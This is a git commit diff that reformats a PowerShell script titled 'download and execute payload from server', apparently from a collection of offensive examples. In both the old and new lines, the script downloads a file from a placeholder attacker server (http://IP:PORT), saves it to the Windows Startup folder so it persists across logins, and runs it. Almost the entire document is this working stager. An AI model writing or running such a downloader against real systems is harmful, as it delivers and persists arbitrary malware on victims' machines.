278e2f18a7bcb9813916065326e0963d6d3d90e2
azuk4r <102126589+azuk4r@users.noreply.github.com>
2024-09-19 17:51:58 +0200

    Update download and execute payload from server.ps1

--- examples/powershell/download and execute payload from server.ps1
+++ examples/powershell/download and execute payload from server.ps1
@@ -1,1 +1,6 @@
-$payload = 'PAYLOAD'; Invoke-WebRequest -Uri "http://IP:PORT/$payload" -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$payload"; Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$payload"
+$payload = 'PAYLOAD'
+
+Invoke-WebRequest -Uri "http://IP:PORT/$payload" `
+	-OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$payload"
+
+Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$payload"
